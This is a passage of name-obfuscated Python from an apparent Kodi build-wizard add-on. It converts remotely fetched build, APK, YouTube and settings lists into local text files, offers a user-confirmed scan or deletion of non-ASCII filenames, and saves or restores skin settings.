    DP .create (ADDONTITLE ,'[COLOR %s][B]Converting Text:[/B][/COLOR]'%(COLOR2 ),'','Please Wait')#line:2166
    if not ld (BL )=='http://':#line:2168
        O00OO0000O0OOO0OO =os .path .join (OO00O0OOOO00O00O0 ,'builds.txt')#line:2169
        OOO00OOO00OOOOOOO ='';O0OO00OOOO00OOOO0 =0 #line:2170
        OO0O0OO00OOO0O0O0 =openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:2171
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]Builds.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:2172
        if WIZARDFILE ==ld (BL ):#line:2173
            try :#line:2174
                O000000OOO00OOOOO ,OO00O0OO0OOO0O000 ,OO000O00OO0O0OOOO =checkWizard ('all')#line:2175
                OOO00OOO00OOOOOOO ='id="%s"\n'%O000000OOO00OOOOO #line:2176
                OOO00OOO00OOOOOOO +='version="%s"\n'%OO00O0OO0OOO0O000 #line:2177
                OOO00OOO00OOOOOOO +='zip="%s"\n'%OO000O00OO0O0OOOO #line:2178
            except :#line:2179
                pass #line:2180
        O0O0O0000O0OOOO0O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)"').findall (OO0O0OO00OOO0O0O0 )#line:2181
        OOOO00O0O00O0OO0O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0OO00OOO0O0O0 )#line:2182
        if len (OOOO00O0O00O0OO0O )==0 :#line:2183
            for O00000OOO000O0OO0 ,OO00O0OO0OOO0O000 ,OO000O00OO0O0OOOO ,OOO00O0OO0O0OO00O ,OOO0O00OO0OO0O0OO ,OO0OOOO00O00OOOOO ,O0O000OOOO000O0OO ,O0OOO0OOOO00O0O0O in O0O0O0000O0OOOO0O :#line:2184
                O0OO00OOOO00OOOO0 +=1 #line:2185
                DP .update (int (percentage (O0OO00OOOO00OOOO0 ,len (OOOO00O0O00O0OO0O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOO000O0OO0 ))#line:2186
                if not OOO00OOO00OOOOOOO =='':OOO00OOO00OOOOOOO +='\n'#line:2187
                OOO00OOO00OOOOOOO +='name="%s"\n'%O00000OOO000O0OO0 #line:2188
                OOO00OOO00OOOOOOO +='version="%s"\n'%OO00O0OO0OOO0O000 #line:2189
                OOO00OOO00OOOOOOO +='url="%s"\n'%OO000O00OO0O0OOOO #line:2190
                OOO00OOO00OOOOOOO +='gui="%s"\n'%OOO00O0OO0O0OO00O #line:2191
                OOO00OOO00OOOOOOO +='kodi="%s"\n'%OOO0O00OO0OO0O0OO #line:2192
                OOO00OOO00OOOOOOO +='theme="%s"\n'%OO0OOOO00O00OOOOO #line:2193
                OOO00OOO00OOOOOOO +='icon="%s"\n'%O0O000OOOO000O0OO #line:2194
                OOO00OOO00OOOOOOO +='fanart="%s"\n'%O0OOO0OOOO00O0O0O #line:2195
                OOO00OOO00OOOOOOO +='preview="http://"\n'#line:2196
                OOO00OOO00OOOOOOO +='adult="no"\n'#line:2197
                OOO00OOO00OOOOOOO +='description="Download %s from %s"\n'%(O00000OOO000O0OO0 ,ADDONTITLE )#line:2198
                if not OO0OOOO00O00OOOOO =='http://':#line:2199
                    O00OOO00000O000O0 =os .path .join (OO00O0OOOO00O00O0 ,'%s_theme.txt'%O00000OOO000O0OO0 )#line:2200
                    O0OO000000O0O0000 ='';O0OOOOOO0O000O0O0 =0 #line:2201
                    OO0O0OO00OOO0O0O0 =openURL (OO0OOOO00O00OOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2202
                    DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]%s_theme.txt[/COLOR]'%(COLOR2 ,COLOR1 ,O00000OOO000O0OO0 ),'','Please Wait')#line:2203
                    O0OO0O00O00O0000O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O0OO00OOO0O0O0 )#line:2204
                    for O00000OOO000O0OO0 ,OO000O00OO0O0OOOO ,O0O000OOOO000O0OO ,O0OOO0OOOO00O0O0O ,O0O0O00OOO0O0OOOO in O0OO0O00O00O0000O :#line:2205
                        O0OOOOOO0O000O0O0 +=1 #line:2206
                        DP .update (int (percentage (O0OOOOOO0O000O0O0 ,len (OOOO00O0O00O0OO0O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOO000O0OO0 ))#line:2207
                        if not O0OO000000O0O0000 =='':O0OO000000O0O0000 +='\n'#line:2208
                        O0OO000000O0O0000 +='name="%s"\n'%O00000OOO000O0OO0 #line:2209
                        O0OO000000O0O0000 +='url="%s"\n'%OO000O00OO0O0OOOO #line:2210
                        O0OO000000O0O0000 +='icon="%s"\n'%O0O000OOOO000O0OO #line:2211
                        O0OO000000O0O0000 +='fanart="%s"\n'%O0OOO0OOOO00O0O0O #line:2212
                        O0OO000000O0O0000 +='adult="no"\n'#line:2213
                        O0OO000000O0O0000 +='description="%s"\n'%O0O0O00OOO0O0OOOO #line:2214
                    O0O0000OOOOO00O00 =open (O00OOO00000O000O0 ,'w');O0O0000OOOOO00O00 .write (O0OO000000O0O0000 );O0O0000OOOOO00O00 .close ()#line:2215
        else :#line:2216
            for O00000OOO000O0OO0 ,OO00O0OO0OOO0O000 ,OO000O00OO0O0OOOO ,OOO00O0OO0O0OO00O ,OOO0O00OO0OO0O0OO ,OO0OOOO00O00OOOOO ,O0O000OOOO000O0OO ,O0OOO0OOOO00O0O0O ,O0OO0O00O00O0OO0O ,O0O0O00OOO0O0OOOO in OOOO00O0O00O0OO0O :#line:2217
                O0OO00OOOO00OOOO0 +=1 #line:2218
                DP .update (int (percentage (O0OO00OOOO00OOOO0 ,len (OOOO00O0O00O0OO0O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOO000O0OO0 ))#line:2219
                if not OOO00OOO00OOOOOOO =='':OOO00OOO00OOOOOOO +='\n'#line:2220
                OOO00OOO00OOOOOOO +='name="%s"\n'%O00000OOO000O0OO0 #line:2221
                OOO00OOO00OOOOOOO +='version="%s"\n'%OO00O0OO0OOO0O000 #line:2222
                OOO00OOO00OOOOOOO +='url="%s"\n'%OO000O00OO0O0OOOO #line:2223
                OOO00OOO00OOOOOOO +='gui="%s"\n'%OOO00O0OO0O0OO00O #line:2224
                OOO00OOO00OOOOOOO +='kodi="%s"\n'%OOO0O00OO0OO0O0OO #line:2225
                OOO00OOO00OOOOOOO +='theme="%s"\n'%OO0OOOO00O00OOOOO #line:2226
                OOO00OOO00OOOOOOO +='icon="%s"\n'%O0O000OOOO000O0OO #line:2227
                OOO00OOO00OOOOOOO +='fanart="%s"\n'%O0OOO0OOOO00O0O0O #line:2228
                OOO00OOO00OOOOOOO +='preview="http://"\n'#line:2229
                OOO00OOO00OOOOOOO +='adult="%s"\n'%O0OO0O00O00O0OO0O #line:2230
                OOO00OOO00OOOOOOO +='description="%s"\n'%O0O0O00OOO0O0OOOO #line:2231
                if not OO0OOOO00O00OOOOO =='http://':#line:2232
                    O00OOO00000O000O0 =os .path .join (OO00O0OOOO00O00O0 ,'%s_theme.txt'%O00000OOO000O0OO0 )#line:2233
                    O0OO000000O0O0000 ='';O0OOOOOO0O000O0O0 =0 #line:2234
                    OO0O0OO00OOO0O0O0 =openURL (OO0OOOO00O00OOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2235
                    DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]%s_theme.txt[/COLOR]'%(COLOR2 ,COLOR1 ,O00000OOO000O0OO0 ),'','Please Wait')#line:2236
                    O0OO0O00O00O0000O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O0OO00OOO0O0O0 )#line:2237
                    for O00000OOO000O0OO0 ,OO000O00OO0O0OOOO ,O0O000OOOO000O0OO ,O0OOO0OOOO00O0O0O ,O0O0O00OOO0O0OOOO in O0OO0O00O00O0000O :#line:2238
                        O0OOOOOO0O000O0O0 +=1 #line:2239
                        DP .update (int (percentage (O0OOOOOO0O000O0O0 ,len (OOOO00O0O00O0OO0O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOO000O0OO0 ))#line:2240
                        if not O0OO000000O0O0000 =='':O0OO000000O0O0000 +='\n'#line:2241
                        O0OO000000O0O0000 +='name="%s"\n'%O00000OOO000O0OO0 #line:2242
                        O0OO000000O0O0000 +='url="%s"\n'%OO000O00OO0O0OOOO #line:2243
                        O0OO000000O0O0000 +='icon="%s"\n'%O0O000OOOO000O0OO #line:2244
                        O0OO000000O0O0000 +='fanart="%s"\n'%O0OOO0OOOO00O0O0O #line:2245
                        O0OO000000O0O0000 +='adult="no"\n'#line:2246
                        O0OO000000O0O0000 +='description="%s"\n'%O0O0O00OOO0O0OOOO #line:2247
                    O0O0000OOOOO00O00 =open (O00OOO00000O000O0 ,'w');O0O0000OOOOO00O00 .write (O0OO000000O0O0000 );O0O0000OOOOO00O00 .close ()#line:2248
        O0O0000OOOOO00O00 =open (O00OO0000O0OOO0OO ,'w');O0O0000OOOOO00O00 .write (OOO00OOO00OOOOOOO );O0O0000OOOOO00O00 .close ()#line:2249
    if not APKFILE =='http://':#line:2251
        O00OO0000O0OOO0OO =os .path .join (OO00O0OOOO00O00O0 ,'apks.txt')#line:2252
        OOO00OOO00OOOOOOO ='';O0OO00OOOO00OOOO0 =0 #line:2253
        OO0O0OO00OOO0O0O0 =openURL (APKFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2254
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]Apks.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:2255
        O0O0O0000O0OOOO0O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)"').findall (OO0O0OO00OOO0O0O0 )#line:2256
        OOOO00O0O00O0OO0O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0OO00OOO0O0O0 )#line:2257
        if len (OOOO00O0O00O0OO0O )==0 :#line:2258
            for O00000OOO000O0OO0 ,OO000O00OO0O0OOOO ,O0O000OOOO000O0OO ,O0OOO0OOOO00O0O0O in O0O0O0000O0OOOO0O :#line:2259
                O0OO00OOOO00OOOO0 +=1 #line:2260
                DP .update (int (percentage (O0OO00OOOO00OOOO0 ,len (O0O0O0000O0OOOO0O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOO000O0OO0 ))#line:2261
                if not OOO00OOO00OOOOOOO =='':OOO00OOO00OOOOOOO +='\n'#line:2262
                OOO00OOO00OOOOOOO +='name="%s"\n'%O00000OOO000O0OO0 #line:2263
                OOO00OOO00OOOOOOO +='section="no"'#line:2264
                OOO00OOO00OOOOOOO +='url="%s"\n'%OO000O00OO0O0OOOO #line:2265
                OOO00OOO00OOOOOOO +='icon="%s"\n'%O0O000OOOO000O0OO #line:2266
                OOO00OOO00OOOOOOO +='fanart="%s"\n'%O0OOO0OOOO00O0O0O #line:2267
                OOO00OOO00OOOOOOO +='adult="no"\n'#line:2268
                OOO00OOO00OOOOOOO +='description="Download %s from %s"\n'%(O00000OOO000O0OO0 ,ADDONTITLE )#line:2269
        else :#line:2270
            for O00000OOO000O0OO0 ,OO000O00OO0O0OOOO ,O0O000OOOO000O0OO ,O0OOO0OOOO00O0O0O ,O0OO0O00O00O0OO0O ,O0O0O00OOO0O0OOOO in OOOO00O0O00O0OO0O :#line:2271
                O0OO00OOOO00OOOO0 +=1 #line:2272
                DP .update (int (percentage (O0OO00OOOO00OOOO0 ,len (OOOO00O0O00O0OO0O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOO000O0OO0 ))#line:2273
                if not OOO00OOO00OOOOOOO =='':OOO00OOO00OOOOOOO +='\n'#line:2274
                OOO00OOO00OOOOOOO +='name="%s"\n'%O00000OOO000O0OO0 #line:2275
                OOO00OOO00OOOOOOO +='section="no"'#line:2276
                OOO00OOO00OOOOOOO +='url="%s"\n'%OO000O00OO0O0OOOO #line:2277
                OOO00OOO00OOOOOOO +='icon="%s"\n'%O0O000OOOO000O0OO #line:2278
                OOO00OOO00OOOOOOO +='fanart="%s"\n'%O0OOO0OOOO00O0O0O #line:2279
                OOO00OOO00OOOOOOO +='adult="%s"\n'%O0OO0O00O00O0OO0O #line:2280
                OOO00OOO00OOOOOOO +='description="%s"\n'%O0O0O00OOO0O0OOOO #line:2281
        O0O0000OOOOO00O00 =open (O00OO0000O0OOO0OO ,'w');O0O0000OOOOO00O00 .write (OOO00OOO00OOOOOOO );O0O0000OOOOO00O00 .close ()#line:2282
    if not YOUTUBEFILE =='http://':#line:2284
        O00OO0000O0OOO0OO =os .path .join (OO00O0OOOO00O00O0 ,'youtube.txt')#line:2285
        OOO00OOO00OOOOOOO ='';O0OO00OOOO00OOOO0 =0 #line:2286
        OO0O0OO00OOO0O0O0 =openURL (YOUTUBEFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2287
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]YouTube.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:2288
        O0O0O0000O0OOOO0O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O0OO00OOO0O0O0 )#line:2289
        for O00000OOO000O0OO0 ,OO000O00OO0O0OOOO ,O0O000OOOO000O0OO ,O0OOO0OOOO00O0O0O ,O0O0O00OOO0O0OOOO in O0O0O0000O0OOOO0O :#line:2290
            O0OO00OOOO00OOOO0 +=1 #line:2291
            DP .update (int (percentage (O0OO00OOOO00OOOO0 ,len (O0O0O0000O0OOOO0O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOO000O0OO0 ))#line:2292
            if not OOO00OOO00OOOOOOO =='':OOO00OOO00OOOOOOO +='\n'#line:2293
            OOO00OOO00OOOOOOO +='name="%s"\n'%O00000OOO000O0OO0 #line:2294
            OOO00OOO00OOOOOOO +='section="no"'#line:2295
            OOO00OOO00OOOOOOO +='url="%s"\n'%OO000O00OO0O0OOOO #line:2296
            OOO00OOO00OOOOOOO +='icon="%s"\n'%O0O000OOOO000O0OO #line:2297
            OOO00OOO00OOOOOOO +='fanart="%s"\n'%O0OOO0OOOO00O0O0O #line:2298
            OOO00OOO00OOOOOOO +='description="%s"\n'%O0O0O00OOO0O0OOOO #line:2299
        O0O0000OOOOO00O00 =open (O00OO0000O0OOO0OO ,'w');O0O0000OOOOO00O00 .write (OOO00OOO00OOOOOOO );O0O0000OOOOO00O00 .close ()#line:2300
    if not ADVANCEDFILE =='http://':#line:2302
        O00OO0000O0OOO0OO =os .path .join (OO00O0OOOO00O00O0 ,'advancedsettings.txt')#line:2303
        OOO00OOO00OOOOOOO ='';O0OO00OOOO00OOOO0 =0 #line:2304
        OO0O0OO00OOO0O0O0 =openURL (ADVANCEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2305
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]AdvancedSettings.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:2306
        O0O0O0000O0OOOO0O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O0OO00OOO0O0O0 )#line:2307
        for O00000OOO000O0OO0 ,OO000O00OO0O0OOOO ,O0O000OOOO000O0OO ,O0OOO0OOOO00O0O0O ,O0O0O00OOO0O0OOOO in O0O0O0000O0OOOO0O :#line:2308
            O0OO00OOOO00OOOO0 +=1 #line:2309
            DP .update (int (percentage (O0OO00OOOO00OOOO0 ,len (O0O0O0000O0OOOO0O ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOO000O0OO0 ))#line:2310
            if not OOO00OOO00OOOOOOO =='':OOO00OOO00OOOOOOO +='\n'#line:2311
            OOO00OOO00OOOOOOO +='name="%s"\n'%O00000OOO000O0OO0 #line:2312
            OOO00OOO00OOOOOOO +='section="no"'#line:2313
            OOO00OOO00OOOOOOO +='url="%s"\n'%OO000O00OO0O0OOOO #line:2314
            OOO00OOO00OOOOOOO +='icon="%s"\n'%O0O000OOOO000O0OO #line:2315
            OOO00OOO00OOOOOOO +='fanart="%s"\n'%O0OOO0OOOO00O0O0O #line:2316
            OOO00OOO00OOOOOOO +='description="%s"\n'%O0O0O00OOO0O0OOOO #line:2317
        O0O0000OOOOO00O00 =open (O00OO0000O0OOO0OO ,'w');O0O0000OOOOO00O00 .write (OOO00OOO00OOOOOOO );O0O0000OOOOO00O00 .close ()#line:2318
    DP .close ()#line:2320
    DIALOG .ok (ADDONTITLE ,'[COLOR %s]Your text files have been converted to 0.1.7 and are location in the [COLOR %s]/addon_data/%s/[/COLOR] folder[/COLOR]'%(COLOR2 ,COLOR1 ,ADDON_ID ))#line:2321
def reloadProfile (profile =None ):#line:2323
    if profile ==None :#line:2324
        ebi ('LoadProfile(Master user)')#line:2331
    else :ebi ('LoadProfile(%s)'%profile )#line:2332
def chunks (O0OOOO0O000OOO0OO ,OOOOO000O0OO00O00 ):#line:2334
    for O0O0000000000OO0O in range (0 ,len (O0OOOO0O000OOO0OO ),OOOOO000O0OO00O00 ):#line:2335
        yield O0OOOO0O000OOO0OO [O0O0000000000OO0O :O0O0000000000OO0O +OOOOO000O0OO00O00 ]#line:2336
def asciiCheck (use =None ,over =False ):#line:2338
    if use ==None :#line:2339
        O00OO00O0OO00O0O0 =DIALOG .browse (3 ,'[COLOR %s]Select the folder you want to scan[/COLOR]'%COLOR2 ,'files','',False ,False ,HOME )#line:2340
        if over ==True :#line:2341
            OO000OOOOO0OOOOO0 =1 #line:2342
        else :#line:2343
            OO000OOOOO0OOOOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Do you want to [COLOR %s]delete[/COLOR] all filenames with special characters or would you rather just [COLOR %s]scan and view[/COLOR] the results in the log?[/COLOR]'%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ='[B][COLOR green]Delete[/COLOR][/B]',nolabel ='[B][COLOR red]Scan[/COLOR][/B]')#line:2344
    else :#line:2345
        O00OO00O0OO00O0O0 =use #line:2346
        OO000OOOOO0OOOOO0 =1 #line:2347
    if O00OO00O0OO00O0O0 =="":#line:2349
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: Cancelled[/COLOR]"%COLOR2 )#line:2350
        return #line:2351
    O000000O0OO0OOO0O =os .path .join (ADDONDATA ,'asciifiles.txt')#line:2353
    O000OO0O0O00O000O =os .path .join (ADDONDATA ,'asciifails.txt')#line:2354
    O00OOOOOOO0O00OOO =open (O000000O0OO0OOO0O ,mode ='w+')#line:2355
    O000O00OO0O0O00O0 =open (O000OO0O0O00O000O ,mode ='w+')#line:2356
    OO0O00OOO0OO0OO00 =0 ;O0OOO0OO0O00000OO =0 #line:2357
    O0O00OO0OO000OO00 =fileCount (O00OO00O0OO00O0O0 )#line:2358
    OO0OO0OO0OO00OOOO =''#line:2359
    OOOOOO0000000OO0O =[]#line:2360
    log ("Source file: (%s)"%str (O00OO00O0OO00O0O0 ),5 )#line:2361
    DP .create (ADDONTITLE ,'Please wait...')#line:2363
    for OOOOO0OO0O00O0O0O ,O0O0OO00O0OOO0OOO ,OO0OO00O0OO000OO0 in os .walk (O00OO00O0OO00O0O0 ):#line:2364
        O0O0OO00O0OOO0OOO [:]=[O0000O0O00OOO0000 for O0000O0O00OOO0000 in O0O0OO00O0OOO0OOO ]#line:2365
        OO0OO00O0OO000OO0 [:]=[O0O0OOOOO00O0O000 for O0O0OOOOO00O0O000 in OO0OO00O0OO000OO0 ]#line:2366
        for OO00O0O00000OOOOO in OO0OO00O0OO000OO0 :#line:2367
            OOOOOO0000000OO0O .append (OO00O0O00000OOOOO )#line:2368
            OO000OOO000OOOOO0 =int (len (OOOOOO0000000OO0O )/float (O0O00OO0OO000OO00 )*100 )#line:2369
            DP .update (OO000OOO000OOOOO0 ,"[COLOR %s]Checking for non ASCII files"%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,d ),'Please Wait[/COLOR]')#line:2370
            try :#line:2371
                OO00O0O00000OOOOO .encode ('ascii')#line:2372
            except UnicodeDecodeError :#line:2373
                O00O0O00O000O0OO0 =os .path .join (OOOOO0OO0O00O0O0O ,OO00O0O00000OOOOO )#line:2374
                if OO000OOOOO0OOOOO0 :#line:2375
                    try :#line:2376
                        os .remove (O00O0O00O000O0OO0 )#line:2377
                        for O0OO000OOOO0O0O0O in chunks (O00O0O00O000O0OO0 ,75 ):#line:2378
                            O00OOOOOOO0O00OOO .write (O0OO000OOOO0O0O0O +'\n')#line:2379
                        O00OOOOOOO0O00OOO .write ('\n')#line:2380
                        OO0O00OOO0OO0OO00 +=1 #line:2381
                        log ("[ASCII Check] File Removed: %s "%O00O0O00O000O0OO0 ,5 )#line:2382
                    except :#line:2383
                        for O0OO000OOOO0O0O0O in chunks (O00O0O00O000O0OO0 ,75 ):#line:2384
                            O000O00OO0O0O00O0 .write (O0OO000OOOO0O0O0O +'\n')#line:2385
                        O000O00OO0O0O00O0 .write ('\n')#line:2386
                        O0OOO0OO0O00000OO +=1 #line:2387
                        log ("[ASCII Check] File Failed: %s "%O00O0O00O000O0OO0 ,5 )#line:2388
                else :#line:2389
                    for O0OO000OOOO0O0O0O in chunks (O00O0O00O000O0OO0 ,75 ):#line:2390
                        O00OOOOOOO0O00OOO .write (O0OO000OOOO0O0O0O +'\n')#line:2391
                    O00OOOOOOO0O00OOO .write ('\n')#line:2392
                    OO0O00OOO0OO0OO00 +=1 #line:2393
                    log ("[ASCII Check] File Found: %s "%O00O0O00O000O0OO0 ,5 )#line:2394
                pass #line:2395
    DP .close ();O00OOOOOOO0O00OOO .close ();O000O00OO0O0O00O0 .close ()#line:2396
    OOOOO0O0OOO00O00O =int (OO0O00OOO0OO0OO00 )+int (O0OOO0OO0O00000OO )#line:2397
    if OOOOO0O0OOO00O00O >0 :#line:2398
        if os .path .exists (O000000O0OO0OOO0O ):O00OOOOOOO0O00OOO =open (O000000O0OO0OOO0O ,mode ='r');OO0OO0OO0OO00OOOO =O00OOOOOOO0O00OOO .read ();O00OOOOOOO0O00OOO .close ()#line:2399
        if os .path .exists (O000OO0O0O00O000O ):O000O00OO0O0O00O0 =open (O000OO0O0O00O000O ,mode ='r');OOO0O000OOOO0OOO0 =O000O00OO0O0O00O0 .read ();O000O00OO0O0O00O0 .close ()#line:2400
        if OO000OOOOO0OOOOO0 :#line:2401
            if use :#line:2402
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: %s Removed / %s Failed.[/COLOR]"%(COLOR2 ,OO0O00OOO0OO0OO00 ,O0OOO0OO0O00000OO ))#line:2403
            else :#line:2404
                TextBox (ADDONTITLE ,"[COLOR yellow][B]%s Files Removed:[/B][/COLOR]\n %s\n\n[COLOR yellow][B]%s Files Failed:[B][/COLOR]\n %s"%(OO0O00OOO0OO0OO00 ,OO0OO0OO0OO00OOOO ,O0OOO0OO0O00000OO ,OOO0O000OOOO0OOO0 ))#line:2405
        else :#line:2406
            TextBox (ADDONTITLE ,"[COLOR yellow][B]%s Files Found:[/B][/COLOR]\n %s"%(OO0O00OOO0OO0OO00 ,OO0OO0OO0OO00OOOO ))#line:2407
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: None Found.[/COLOR]"%COLOR2 )#line:2408
def fileCount (O00000OO00OO00OO0 ,excludes =True ):#line:2410
    O0000O00O0O0O0O0O =[ADDON_ID ,'cache','system','packages','Thumbnails','peripheral_data','temp','My_Builds','library','keymaps']#line:2411
    O00OO00OO0O00OOOO =['Textures13.db','.DS_Store','advancedsettings.xml','Thumbs.db','.gitignore']#line:2412
    O00O0000000OO0OOO =[]#line:2413
    for O00OOOO00O0OOO000 ,O0OOO0O00O0OOO0O0 ,OOOOOO0OOO00O00O0 in os .walk (O00000OO00OO00OO0 ):#line:2414
        if excludes :#line:2415
            O0OOO0O00O0OOO0O0 [:]=[O0000O0O0O0O0OO0O for O0000O0O0O0O0OO0O in O0OOO0O00O0OOO0O0 if O0000O0O0O0O0OO0O not in O0000O00O0O0O0O0O ]#line:2416
            OOOOOO0OOO00O00O0 [:]=[O0O000OO0000OO0O0 for O0O000OO0000OO0O0 in OOOOOO0OOO00O00O0 if O0O000OO0000OO0O0 not in O00OO00OO0O00OOOO ]#line:2417
        for OOO0O00O0OOOOOOO0 in OOOOOO0OOO00O00O0 :#line:2418
            O00O0000000OO0OOO .append (OOO0O00O0OOOOOOO0 )#line:2419
    return len (O00O0000000OO0OOO )#line:2420
def defaultSkin ():#line:2422
    log ("[Default Skin Check]",5 )#line:2423
    OO00O00OO0O00O0OO =os .path .join (USERDATA ,'guitemp.xml')#line:2424
    O000O0OOOOO00000O =OO00O00OO0O00O0OO if os .path .exists (OO00O00OO0O00O0OO )else GUISETTINGS #line:2425
    if not os .path .exists (O000O0OOOOO00000O ):return False #line:2426
    log ("Reading gui file: %s"%O000O0OOOOO00000O ,5 )#line:2427
    OO00OO00O00OO0OOO =open (O000O0OOOOO00000O ,'r+')#line:2428
    OO0OOOOOO00OO0OO0 =OO00OO00O00OO0OOO .read ().replace ('\n','').replace ('\r','').replace ('\t','').replace ('    ','');OO00OO00O00OO0OOO .close ()#line:2429
    log ("Opening gui settings",5 )#line:2430
    O0000OOOOO0OO0OOO =re .compile ('<lookandfeel>.+?<ski.+?>(.+?)</skin>.+?</lookandfeel>').findall (OO0OOOOOO00OO0OO0 )#line:2431
    log ("Matches: %s"%str (O0000OOOOO0OO0OOO ),5 )#line:2432
    if len (O0000OOOOO0OO0OOO )>0 :#line:2433
        O0O0OOO00OOOO0000 =O0000OOOOO0OO0OOO [0 ]#line:2434
        O00000OO0O00O0000 =os .path .join (ADDONS ,O0000OOOOO0OO0OOO [0 ],'addon.xml')#line:2435
        if os .path .exists (O00000OO0O00O0000 ):#line:2436
            OO000000000O00OO0 =open (O00000OO0O00O0000 ,'r+')#line:2437
            O00OO0OOO0O00O0O0 =OO000000000O00OO0 .read ();OO000000000O00OO0 .close ()#line:2438
            OOO000OOO0OOO00OO =parseDOM (O00OO0OOO0O00O0O0 ,'addon',ret ='name')#line:2439
            if len (OOO000OOO0OOO00OO )>0 :O000O0O00O0OO0OOO =OOO000OOO0OOO00OO [0 ]#line:2440
            else :O000O0O00O0OO0OOO ='no match'#line:2441
        else :O000O0O00O0OO0OOO ='no file'#line:2442
        log ("[Default Skin Check] Skin name: %s"%O000O0O00O0OO0OOO ,5 )#line:2443
        log ("[Default Skin Check] Skin id: %s"%O0O0OOO00OOOO0000 ,5 )#line:2444
        setS ('defaultskin',O0O0OOO00OOOO0000 )#line:2445
        setS ('defaultskinname',O000O0O00O0OO0OOO )#line:2446
        setS ('defaultskinignore','false')#line:2447
    if os .path .exists (OO00O00OO0O00O0OO ):#line:2448
        log ("Deleting Temp Gui File.",5 )#line:2449
        os .remove (OO00O00OO0O00O0OO )#line:2450
    log ("[Default Skin Check] End",5 )#line:2451
def lookandFeelData (do ='save'):#line:2453
    OO0000O0OOO0OO0OO =['lookandfeel.enablerssfeeds','lookandfeel.font','lookandfeel.rssedit','lookandfeel.skincolors','lookandfeel.skintheme','lookandfeel.skinzoom','lookandfeel.soundskin','lookandfeel.startupwindow','lookandfeel.stereostrength']#line:2454
    if do =='save':#line:2455
        for O0O000OOO00O00000 in OO0000O0OOO0OO0OO :#line:2456
            OOO000O0000O0OO0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":"%s"}, "id":1}'%(O0O000OOO00O00000 )#line:2457
            OO0OO00OO0O000O00 =xbmc .executeJSONRPC (OOO000O0000O0OO0O )#line:2458
            if not 'error'in OO0OO00OO0O000O00 :#line:2459
                OO0OOOOO00000O00O =re .compile ('{"value":(.+?)}').findall (str (OO0OO00OO0O000O00 ))#line:2460
                setS (O0O000OOO00O00000 .replace ('lookandfeel','default'),OO0OOOOO00000O00O [0 ])#line:2461
                log ("%s saved to %s"%(O0O000OOO00O00000 ,OO0OOOOO00000O00O [0 ]),5 )#line:2462
    else :#line:2463
        for O0O000OOO00O00000 in OO0000O0OOO0OO0OO :#line:2464
            OO0O00OOOO0000OOO =getS (O0O000OOO00O00000 .replace ('lookandfeel','default'))#line:2465
            OOO000O0000O0OO0O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":"%s","value":%s}, "id":1}'%(O0O000OOO00O00000 ,OO0O00OOOO0000OOO )#line:2466
            OO0OO00OO0O000O00 =xbmc .executeJSONRPC (OOO000O0000O0OO0O )#line:2467
            log ("%s restored to %s"%(O0O000OOO00O00000 ,OO0O00OOOO0000OOO ),5 )#line:2468
def sep (middle =''):#line:2470
    O0000O0OOO0OOOOOO =uservar .SPACER #line:2471
    O000OO000O00O00O0 =O0000O0OOO0OOOOOO *40 #line:2472
    if not middle =='':#line:2473
